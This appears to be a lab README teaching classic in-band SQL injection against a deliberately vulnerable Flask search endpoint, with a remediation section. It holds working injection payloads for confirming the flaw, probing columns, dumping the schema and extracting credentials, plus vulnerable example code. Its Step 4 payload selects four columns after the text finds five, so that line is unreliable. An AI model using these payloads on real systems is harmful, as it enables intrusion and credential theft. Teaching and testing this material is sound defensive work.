# SQL Injection — Classic (In-band) via UNION SELECT

## Overview

SQL Injection occurs when user input is directly concatenated into a SQL query. An attacker can write SQL commands in an input field to read, modify, or delete any data in the database.

It has ranked as the #1 vulnerability on the OWASP Top 10 list for years and remains one of the most common and dangerous web application security flaws.

This project demonstrates the "Classic (In-band)" type — the results of the attacker's injected SQL appear directly on the page.

## Vulnerable Code

```python
@app.route('/search')
def search():
    q = request.args.get('q', '')
    
    # VULNERABLE: raw SQL via f-string interpolation
    sql = f"SELECT id, title, content, category, created_at FROM notes WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'"
    
    result = db.session.execute(text(sql))
    results = result.fetchall()
```

The problem: the `q` variable is pasted directly into the SQL query string. If the user writes SQL commands in the `q` parameter, they become part of the executed query.

## Attack Steps

### Step 1 — Confirm Injection

Normal search:
```
/search?q=psychology
```
Generated SQL:
```sql
SELECT ... FROM notes WHERE title LIKE '%psychology%' OR content LIKE '%psychology%'
```

Injection test:
```
/search?q=' OR 1=1 --
```
Generated SQL:
```sql
SELECT ... FROM notes WHERE title LIKE '%' OR 1=1 --%' OR content LIKE '%' OR 1=1 --%'
```

What happened:
- The `'` character closed the LIKE string
- `OR 1=1` evaluates to true for every row, so ALL records are returned
- `--` turns the rest of the query into a comment

Result: instead of a search, the entire notes table is dumped.

### Step 2 — Determine Column Count

UNION SELECT requires matching the exact number of columns in the original query. The attacker increments `ORDER BY` until an error occurs:

```
/search?q=' ORDER BY 1 --    ← OK
/search?q=' ORDER BY 2 --    ← OK
/search?q=' ORDER BY 3 --    ← OK
/search?q=' ORDER BY 4 --    ← OK
/search?q=' ORDER BY 5 --    ← OK
/search?q=' ORDER BY 6 --    ← ERROR!
```

Error at 6 → the table has 5 columns.

### Step 3 — Discover Database Schema

In SQLite, the `sqlite_master` table contains the structure (CREATE TABLE statements) of every table:

```
/search?q=' UNION SELECT 'x','x',sql,tbl_name,'schema' FROM sqlite_master WHERE type='table' --
```

Result: the search results now include:

- `notes` table: id, title, content, category, created_at
- `users` table: id, username, **password**, role, created_at

The attacker now knows exactly which tables exist and what columns they contain.

### Step 4 — Dump Credentials

```
/search?q=' UNION SELECT 0,username,password,role FROM users --
```

Result: all usernames and **plaintext passwords** appear among the search results.

### Step 5 — Verify

The attacker logs in with each stolen credential. Since passwords are stored in plaintext, they are immediately usable.

## Why It Works

1. **f-string interpolation**: User input can modify the SQL query structure
2. **Error messages exposed**: SQL errors are shown to the user, leaking query structure
3. **DEBUG SQL display**: The executed SQL is shown on the page (wouldn't happen in production, but illustrates information disclosure)
4. **Plaintext passwords**: Once read, they can be used immediately — hashing would require an extra cracking step
5. **Single database user**: The application accesses all tables with the same privileges

## Fix (Remediation)

### 1. Parameterized Queries (Prepared Statements)

```python
# VULNERABLE (current code):
sql = f"SELECT * FROM notes WHERE title LIKE '%{q}%'"

# SAFE:
from sqlalchemy import text
sql = "SELECT * FROM notes WHERE title LIKE :q"
result = db.session.execute(text(sql), {"q": f"%{q}%"})
```

In a parameterized query, user input is bound to a placeholder (`:q` or `?`). The database engine never interprets it as a SQL command.

### 2. Use the ORM

```python
# The /notes endpoint in this app already does this — it's safe:
notes = Note.query.filter(Note.title.like(f"%{q}%")).all()
```

ORMs automatically generate parameterized queries under the hood.

### 3. Suppress Error Messages

```python
except Exception as e:
    # VULNERABLE:
    return str(e)  # leaks SQL internals
    
    # SAFE:
    app.logger.error(f"Search error: {e}")
    return "An error occurred", 500
```

### 4. Least Privilege

Grant the database user only the permissions it needs:
```sql
-- Restricted user for the web app:
GRANT SELECT ON notes TO webapp_user;
-- No access to users table!
```

## Example Script Output

```
PHASE 1 — Test Basic Injection
  [*] Normal search: q=test
  [*]   Normal results: 2
  [*] Injection payload: q=' OR 1=1 --
  [+] Injection works! 9 results returned (vs 2 normal)

PHASE 3 — Discover Database Schema
  [+] Found 2 table(s):
  TABLE: notes
    ├─ id (INTEGER)
    ├─ title (VARCHAR(200))
    ├─ content (TEXT)
    ├─ category (VARCHAR(50))
    ├─ created_at (DATETIME)
  TABLE: users
    ├─ id (INTEGER)
    ├─ username (VARCHAR(80))
    ├─ password (VARCHAR(120))  ← PLAINTEXT!
    ├─ role (VARCHAR(20))

PHASE 4 — Dump User Credentials
  USERNAME            PASSWORD                 ROLE
  ───────────────────────────────────────────────────────
  admin               admin123                 admin
  potato              test123                  user
```

## Other SQLi Types

This project also demonstrates the following types using the same vulnerable endpoint:

- **Blind (Boolean-based)**: Results are not visible; data is extracted from the difference between "results found" vs "no results"
- **Time-based Blind**: Data is extracted by measuring response time differences caused by injected delay functions

All three use the same `/search` endpoint — the difference is in the attack technique.

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
